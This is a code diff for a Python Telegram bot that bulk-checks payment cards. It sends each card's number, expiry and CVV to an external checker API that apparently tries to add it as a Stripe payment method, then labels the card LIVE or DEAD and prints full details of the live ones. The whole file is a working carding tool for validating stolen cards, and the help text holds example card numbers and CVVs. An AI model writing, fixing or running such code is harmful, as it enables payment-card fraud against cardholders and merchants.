@@ -1,8 +1,8 @@
 import os
 import re
-import aiohttp
-import asyncio
+import requests
 import urllib.parse
+import time
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from typing import List, Dict, Any
@@ -47,45 +47,58 @@ def parse_card_line(line: str) -> Dict[str, Any]:
         "line": line.strip()
     }
 
-async def check_single_card(session: aiohttp.ClientSession, card_info: Dict[str, Any]) -> Dict[str, Any]:
-    """Check a single card via API (async)."""
+def check_card_accurately(card_info: Dict[str, Any]) -> Dict[str, Any]:
+    """Check card with PROPER status detection."""
     try:
         card_string = f"{card_info['card_number']}|{card_info['month']}|{card_info['year']}|{card_info['cvv']}"
         encoded_card = urllib.parse.quote(card_string, safe='')
         api_url = f"{BASE_API_URL}/{EMAIL}/{PASSWORD}/{encoded_card}"
         
-        async with session.get(api_url, timeout=45) as response:
-            text = await response.text()
-            
-            # Determine status
-            status, message = get_card_status(text)
-            
-            # Get brand
-            bin_num = card_info['bin']
-            brand_info = BANK_DATABASE.get(bin_num[0], {"brand": "UNKNOWN", "country": "UNKNOWN"})
-            
-            return {
-                "card": f"{card_info['bin']}...{card_info['last4']}",
-                "full_card": card_info['card_number'],
-                "exp": f"{card_info['month']}/{card_info['year_full']}",
-                "cvv": card_info['cvv'],
-                "status": status,
-                "message": message,
-                "brand": brand_info["brand"],
-                "country": brand_info["country"],
-                "is_live": "✅" in status,
-                "raw": card_info['line'],
-                "response": text[:100]
-            }
-            
-    except asyncio.TimeoutError:
+        print(f"\n{'='*60}")
+        print(f"Checking: {card_info['bin']}...{card_info['last4']}")
+        print(f"API URL: {api_url}")
+        
+        # Make request
+        response = requests.get(api_url, timeout=30)
+        print(f"Status Code: {response.status_code}")
+        print(f"Raw Response: {response.text}")
+        
+        # Get accurate status
+        status, message = get_exact_status(response.text)
+        is_live = is_card_live(response.text)
+        
+        # Get brand
+        bin_num = card_info['bin']
+        brand_info = BANK_DATABASE.get(bin_num[0], {"brand": "UNKNOWN", "country": "UNKNOWN"})
+        
+        result = {
+            "card": f"{card_info['bin']}...{card_info['last4']}",
+            "full_card": card_info['card_number'],
+            "exp": f"{card_info['month']}/{card_info['year_full']}",
+            "cvv": card_info['cvv'],
+            "status": status,
+            "message": message,
+            "brand": brand_info["brand"],
+            "country": brand_info["country"],
+            "is_live": is_live,
+            "raw": card_info['line'],
+            "response": response.text
+        }
+        
+        print(f"Result: {status} | Live: {is_live} | Message: {message}")
+        print('='*60)
+        
+        return result
+        
+    except requests.exceptions.Timeout:
+        print("❌ Timeout after 30 seconds")
         return {
             "card": f"{card_info['bin']}...{card_info['last4']}",
             "full_card": card_info['card_number'],
             "exp": f"{card_info['month']}/{card_info['year_full']}",
             "cvv": card_info['cvv'],
             "status": "❌ TIMEOUT",
-            "message": "45s timeout",
+            "message": "30s timeout - server busy",
             "brand": "UNKNOWN",
             "country": "UNKNOWN",
             "is_live": False,
@@ -93,6 +106,7 @@ async def check_single_card(session: aiohttp.ClientSession, card_info: Dict[str,
             "response": "Timeout"
         }
     except Exception as e:
+        print(f"❌ Error: {str(e)}")
         return {
             "card": f"{card_info['bin']}...{card_info['last4']}",
             "full_card": card_info['card_number'],
@@ -107,99 +121,89 @@ async def check_single_card(session: aiohttp.ClientSession, card_info: Dict[str,
             "response": "Error"
         }
 
-def get_card_status(response_text: str) -> tuple:
-    """Get card status from API response."""
+def get_exact_status(response_text: str) -> tuple:
+    """Get EXACT status from API response."""
     if not response_text:
-        return "❌ NO RESPONSE", "No response"
+        return "❌ NO RESPONSE", "Empty response"
     
+    # Debug: Show what we're checking
+    print(f"Checking response: {response_text[:200]}")
+    
+    # Convert to lowercase for checking
     text = response_text.lower().strip()
     
-    # LIVE indicators
-    live_keywords = [
+    # Check for LIVE cards (SUCCESS)
+    if any(word in text for word in [
         "payment method added",
-        "payment added", 
+        "payment added",
         "added successfully",
         "successfully added",
         "approved",
-        "success"
-    ]
+        "success",
+        "valid",
+        "payment successful",
+        "method added"
+    ]):
+        return "✅ LIVE", "Payment successful"
     
-    for keyword in live_keywords:
-        if keyword in text:
-            return "✅ LIVE", "Payment added"
+    # Check for SPECIFIC errors from your API
+    if "your card number is incorrect" in text:
+        return "❌ INCORRECT", "Card number incorrect"
     
-    # DEAD indicators
-    dead_keywords = [
-        "card declined",
-        "your card was declined",
-        "card number is incorrect",
-        "invalid card",
-        "insufficient funds",
-        "expired card",
-        "incorrect cvc",
-        "stripe pm creation failed"
-    ]
+    if "your card was declined" in text:
+        return "❌ DECLINED", "Card declined"
     
-    for keyword in dead_keywords:
-        if keyword in text:
-            return "❌ DECLINED", keyword.title()
+    if "card declined" in text:
+        return "❌ DECLINED", "Card declined"
     
-    # If short response and not error, assume LIVE
-    if len(text) < 100 and "error" not in text:
-        return "✅ LIVE", "Success"
+    if "insufficient funds" in text:
+        return "❌ NO FUNDS", "Insufficient funds"
     
-    return "⚠️ UNKNOWN", text[:50]
+    if "expired card" in text:
+        return "❌ EXPIRED", "Card expired"
+    
+    if "incorrect cvc" in text or "wrong cvc" in text:
+        return "❌ WRONG CVC", "Incorrect CVC"
+    
+    if "stripe pm creation failed" in text:
+        return "❌ STRIPE FAILED", "Stripe payment failed"
+    
+    # Check for JSON error response
+    if '"error":' in text:
+        # Try to extract error message
+        error_match = re.search(r'"error":"([^"]+)"', text)
+        if error_match:
+            error_msg = error_match.group(1)
+            return f"❌ {error_msg[:20]}", error_msg
+    
+    # If response is short and contains success indicators
+    if len(text) < 100:
+        if "200" in text or "ok" in text:
+            return "✅ LIVE", "Success"
+    
+    # Default to checking status code or content
+    if "decline" in text or "fail" in text or "invalid" in text:
+        return "❌ DECLINED", "Payment failed"
+    
+    return "⚠️ UNKNOWN", f"Response: {text[:50]}"
 
-async def check_all_cards_at_once(cards: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
-    """Check ALL cards at the SAME TIME (parallel)."""
-    # Create a session for all requests
-    connector = aiohttp.TCPConnector(limit=50)  # Allow 50 concurrent connections
-    timeout = aiohttp.ClientTimeout(total=60)  # 60 seconds total timeout
-    
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        # Create tasks for ALL cards
-        tasks = [check_single_card(session, card) for card in cards]
-        
-        # Run ALL tasks concurrently
-        print(f"🚀 Starting parallel check for {len(cards)} cards...")
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        # Process results
-        valid_results = []
-        for i, result in enumerate(results):
-            if isinstance(result, dict):
-                valid_results.append(result)
-            else:
-                # Create error result for failed checks
-                card = cards[i]
-                valid_results.append({
-                    "card": f"{card['bin']}...{card['last4']}",
-                    "full_card": card['card_number'],
-                    "exp": f"{card['month']}/{card['year_full']}",
-                    "cvv": card['cvv'],
-                    "status": "❌ ERROR",
-                    "message": str(result)[:50],
-                    "brand": "UNKNOWN",
-                    "country": "UNKNOWN",
-                    "is_live": False,
-                    "raw": card['line'],
-                    "response": "Check failed"
-                })
-        
-        return valid_results
+def is_card_live(response_text: str) -> bool:
+    """Determine if card is LIVE based on response."""
+    status, _ = get_exact_status(response_text)
+    return "✅" in status
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /start command."""
     await update.message.reply_text(
-        "⚡ *PARALLEL CARD CHECKER*\n\n"
-        "*Check ALL cards at SAME TIME!*\n\n"
+        "🎯 *ACCURATE CARD CHECKER*\n\n"
+        "*Checks cards ONE BY ONE for accuracy*\n\n"
         "*Single Check:*\n"
         "`/chk 5328544152353125|12|28|923`\n\n"
-        "*Mass Check (1-30 cards):*\n"
-        "`/mass` then send cards\n"
-        "*All cards checked simultaneously*\n\n"
+        "*Mass Check (1-10 cards):*\n"
+        "`/mass` then send cards\n\n"
         "*Format:*\n"
-        "`CARD|MM|YY|CVV`",
+        "`CARD|MM|YY|CVV`\n\n"
+        "*Note:* Shows exact API response",
         parse_mode='Markdown'
     )
 
@@ -216,26 +220,26 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Wrong format!")
         return
     
-    msg = await update.message.reply_text(f"🔍 Checking...")
+    msg = await update.message.reply_text(f"🔍 Checking `{card_info['bin']}...{card_info['last4']}`...")
     
-    # Check single card
-    connector = aiohttp.TCPConnector()
-    timeout = aiohttp.ClientTimeout(total=45)
-    
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        result = await check_single_card(session, card_info)
+    # Check card
+    result = check_card_accurately(card_info)
     
     # Format response
     response = f"💳 *CARD:* `{result['card']}`\n"
     response += f"📅 *EXP:* {result['exp']} | *CVV:* {result['cvv']}\n"
     response += f"🏷️ *BRAND:* {result['brand']}\n"
-    response += "─" * 30 + "\n"
+    response += "─" * 35 + "\n"
     response += f"*STATUS:* {result['status']}\n"
     response += f"*MESSAGE:* {result['message']}\n"
     
+    # Show API response for debugging
+    if len(result['response']) < 200:
+        response += f"*API RESPONSE:* `{result['response']}`\n"
+    
     if result['is_live']:
-        response += "─" * 30 + "\n"
-        response += "🎯 *LIVE CARD!*\n"
+        response += "─" * 35 + "\n"
+        response += "🎯 *LIVE CARD CONFIRMED!*\n"
         response += f"`{result['full_card']}|{result['exp'].replace('/', '|')}|{result['cvv']}`\n"
     
     await msg.edit_text(response, parse_mode='Markdown')
@@ -246,15 +250,15 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['mass_mode'] = True
     
     await update.message.reply_text(
-        "🚀 *PARALLEL MASS CHECK*\n\n"
-        "*All cards checked AT ONCE!*\n"
-        "• Max 30 cards\n"
-        "• All checked simultaneously\n"
-        "• Fast results (1-2 minutes)\n\n"
-        "Send cards (1-30), one per line:\n"
+        "📦 *ACCURATE MASS CHECK*\n\n"
+        "*Checks cards SEQUENTIALLY*\n"
+        "• Max 10 cards\n"
+        "• 30 seconds per card\n"
+        "• Shows exact API responses\n\n"
+        "Send cards (1-10), one per line:\n"
         "Example:\n"
-        "`5328544152353125|12|28|923`\n"
-        "`4111111111111111|12|25|123`\n\n"
+        "`4116670005727071|02|2026|426`\n"
+        "`5275150332990746|01|2030|193`\n\n"
         "Then send `/done`",
         parse_mode='Markdown'
     )
@@ -268,90 +272,90 @@ async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     cards = context.user_data['mass_cards']
     
-    if len(cards) > 30:
-        await update.message.reply_text(f"❌ Max 30! You sent {len(cards)}")
+    if len(cards) > 10:
+        await update.message.reply_text(f"❌ Max 10 cards! You sent {len(cards)}")
         context.user_data['mass_mode'] = False
         return
     
-    await process_mass_parallel(update, cards)
+    await process_mass_sequential(update, cards)
 
-async def process_mass_parallel(update: Update, cards: List[Dict[str, Any]]):
-    """Process ALL cards in PARALLEL."""
+async def process_mass_sequential(update: Update, cards: List[Dict[str, Any]]):
+    """Process cards one by one (sequential)."""
     total = len(cards)
     
     # Show starting message
     msg = await update.message.reply_text(
-        f"🚀 *PARALLEL CHECK STARTED*\n"
+        f"🔄 *SEQUENTIAL CHECK STARTED*\n"
         f"📊 Cards: {total}\n"
-        f"⚡ Checking ALL cards simultaneously...\n"
-        f"⏱️ Estimated time: 1-2 minutes",
+        f"⏱️ Estimated time: {total * 30} seconds\n"
+        f"Checking 1/{total}...",
         parse_mode='Markdown'
     )
     
-    # Check ALL cards at once
-    start_time = asyncio.get_event_loop().time()
-    results = await check_all_cards_at_once(cards)
-    elapsed_time = asyncio.get_event_loop().time() - start_time
+    results = []
+    start_time = time.time()
+    
+    for i, card_info in enumerate(cards, 1):
+        # Update progress
+        await msg.edit_text(
+            f"🔄 *CHECKING {i}/{total}*\n"
+            f"Card: `{card_info['bin']}...{card_info['last4']}`\n"
+            f"Time elapsed: {int(time.time() - start_time)}s",
+            parse_mode='Markdown'
+        )
+        
+        # Check card
+        result = check_card_accurately(card_info)
+        results.append(result)
+        
+        # Small delay between cards
+        if i < len(cards):
+            time.sleep(5)
+    
+    total_time = time.time() - start_time
     
     # Analyze results
     live_cards = [r for r in results if r['is_live']]
     dead_cards = [r for r in results if not r['is_live']]
     
     # Build summary
-    summary = f"📊 *PARALLEL CHECK COMPLETE*\n"
+    summary = f"📊 *CHECK COMPLETE*\n"
     summary += "─" * 35 + "\n"
     summary += f"✅ *LIVE CARDS:* {len(live_cards)}\n"
     summary += f"❌ *DEAD CARDS:* {len(dead_cards)}\n"
     summary += f"📁 *TOTAL CHECKED:* {total}\n"
-    summary += f"⏱️ *TIME TAKEN:* {elapsed_time:.1f} seconds\n"
+    summary += f"⏱️ *TIME TAKEN:* {total_time:.1f} seconds\n"
     summary += "─" * 35 + "\n\n"
     
     # Show LIVE cards
     if live_cards:
         summary += "🎯 *LIVE CARDS FOUND:*\n\n"
-        for i, card in enumerate(live_cards[:10], 1):  # Show first 10 live cards
+        for i, card in enumerate(live_cards, 1):
             summary += f"{i}. `{card['full_card']}|{card['exp'].replace('/', '|')}|{card['cvv']}`\n"
-            summary += f"   {card['brand']} | {card['exp']} | {card['cvv']}\n\n"
-        
-        if len(live_cards) > 10:
-            summary += f"... and {len(live_cards) - 10} more live cards\n\n"
+            summary += f"   {card['brand']} | {card['exp']} | {card['cvv']}\n"
+            summary += f"   Status: {card['status']} - {card['message']}\n\n"
     
-    # Show dead cards summary
+    # Show dead cards with details
     if dead_cards:
         summary += f"❌ *DEAD CARDS:* {len(dead_cards)}\n"
         
-        # Count by status
-        status_count = {}
+        # Group by status with counts
+        status_groups = {}
         for card in dead_cards:
             status = card['status']
-            status_count[status] = status_count.get(status, 0) + 1
+            if status not in status_groups:
+                status_groups[status] = []
+            status_groups[status].append(card)
         
-        for status, count in status_count.items():
-            summary += f"   {status}: {count}\n"
+        for status, cards_list in status_groups.items():
+            summary += f"\n{status}: {len(cards_list)} cards\n"
+            for card in cards_list[:3]:  # Show first 3 of each type
+                summary += f"   • {card['card']} - {card['message']}\n"
+            if len(cards_list) > 3:
+                summary += f"   ... and {len(cards_list) - 3} more\n"
     
     # Send results
-    if len(summary) > 4000:
-        # Split message
-        parts = []
-        current = ""
-        for line in summary.split('\n'):
-            if len(current) + len(line) + 1 < 4000:
-                current += line + "\n"
-            else:
-                parts.append(current)
-                current = line + "\n"
-        if current:
-            parts.append(current)
-        
-        # Send first part
-        await msg.edit_text(parts[0], parse_mode='Markdown')
-        
-        # Send remaining parts
-        for part in parts[1:]:
-            if part.strip():
-                await update.message.reply_text(part, parse_mode='Markdown')
-    else:
-        await msg.edit_text(summary, parse_mode='Markdown')
+    await msg.edit_text(summary, parse_mode='Markdown')
     
     # Clean up
     context.user_data['mass_mode'] = False
@@ -379,7 +383,7 @@ async def handle_mass_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['mass_cards'].extend(valid_cards)
     total = len(context.user_data['mass_cards'])
     
-    await update.message.reply_text(f"✅ Added {len(valid_cards)} cards | Total: {total}/30")
+    await update.message.reply_text(f"✅ Added {len(valid_cards)} cards | Total: {total}/10")
 
 async def handle_direct_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle direct card input."""
@@ -399,30 +403,48 @@ async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             del context.user_data['mass_cards']
         await update.message.reply_text("❌ Cancelled")
 
-async def test_parallel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Test parallel checking."""
-    test_cards = [
-        "4242424242424242|12|2025|123",  # Test card 1
-        "4000000000000002|12|2025|123",  # Test card 2
-        "5555555555554444|12|2026|123",  # Test card 3
-    ]
+async def debug_response(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Debug API response for a card."""
+    if not context.args:
+        await update.message.reply_text("Send: `/debug CARD|MM|YY|CVV`")
+        return
     
-    cards = [parse_card_line(card) for card in test_cards if parse_card_line(card)]
+    card_input = " ".join(context.args)
+    card_info = parse_card_line(card_input)
     
-    msg = await update.message.reply_text("🧪 Testing parallel checking...")
+    if not card_info:
+        await update.message.reply_text("❌ Invalid format")
+        return
     
-    results = await check_all_cards_at_once(cards)
+    msg = await update.message.reply_text("🔧 Debugging...")
     
-    response = "🧪 *PARALLEL TEST RESULTS*\n"
-    response += "─" * 30 + "\n"
+    # Make API call
+    card_string = f"{card_info['card_number']}|{card_info['month']}|{card_info['year']}|{card_info['cvv']}"
+    encoded_card = urllib.parse.quote(card_string, safe='')
+    api_url = f"{BASE_API_URL}/{EMAIL}/{PASSWORD}/{encoded_card}"
     
-    for result in results:
-        response += f"Card: {result['card']}\n"
-        response += f"Status: {result['status']}\n"
-        response += f"Message: {result['message']}\n"
-        response += "─" * 30 + "\n"
-    
-    await msg.edit_text(response, parse_mode='Markdown')
+    try:
+        response = requests.get(api_url, timeout=30)
+        
+        debug_text = f"🔧 *DEBUG FOR:* `{card_info['bin']}...{card_info['last4']}`\n"
+        debug_text += "─" * 40 + "\n"
+        debug_text += f"*API URL:* `{api_url[:80]}...`\n"
+        debug_text += f"*Status Code:* {response.status_code}\n"
+        debug_text += f"*Raw Response:*\n```\n{response.text}\n```\n"
+        debug_text += "─" * 40 + "\n"
+        
+        # Analyze response
+        status, message = get_exact_status(response.text)
+        is_live = is_card_live(response.text)
+        
+        debug_text += f"*Detected Status:* {status}\n"
+        debug_text += f"*Message:* {message}\n"
+        debug_text += f"*Is Live?:* {is_live}\n"
+        
+        await msg.edit_text(debug_text, parse_mode='Markdown')
+        
+    except Exception as e:
+        await msg.edit_text(f"❌ Debug Error: {str(e)}")
 
 def main():
     """Start the bot."""
@@ -439,22 +461,23 @@ def main():
     app.add_handler(CommandHandler("mass", mass_command))
     app.add_handler(CommandHandler("done", done_command))
     app.add_handler(CommandHandler("cancel", cancel_command))
-    app.add_handler(CommandHandler("test", test_parallel))
+    app.add_handler(CommandHandler("debug", debug_response))
     
     # Handlers
     app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^\.chk\s+'), chk_command))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_direct_card))
     
-    print("🚀 PARALLEL CARD CHECKER BOT")
+    print("🎯 ACCURATE CARD CHECKER BOT")
     print("=" * 60)
     print("Features:")
-    print("  • Checks ALL cards SIMULTANEOUSLY")
-    print("  • Max 30 cards at once")
-    print("  • Fast parallel processing")
+    print("  • Checks cards ONE BY ONE")
+    print("  • Shows exact API responses")
+    print("  • Accurate status detection")
+    print("  • Debug command for testing")
     print("\nCommands:")
     print("  /chk <card> - Single check")
-    print("  /mass - Parallel mass check (1-30 cards)")
-    print("  /test - Test parallel checking")
+    print("  /mass - Mass check (1-10 cards)")
+    print("  /debug <card> - See raw API response")
     print("=" * 60)
     
     app.run_polling()
